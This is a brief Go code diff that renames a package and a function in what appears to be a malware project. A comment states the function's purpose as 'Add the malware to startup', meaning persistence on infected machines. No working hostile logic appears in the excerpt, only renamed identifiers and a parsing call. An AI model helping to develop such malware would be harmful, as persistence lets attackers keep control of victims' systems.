@@ -1,4 +1,4 @@
-package system
+package startup
 
 import (
 	"fmt"
@@ -7,7 +7,7 @@ import (
 )
 
 // Add the malware to startup
-func Add_to_startup(s_json string) ([]string, string) {
+func Add(s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "Add_startup"
 
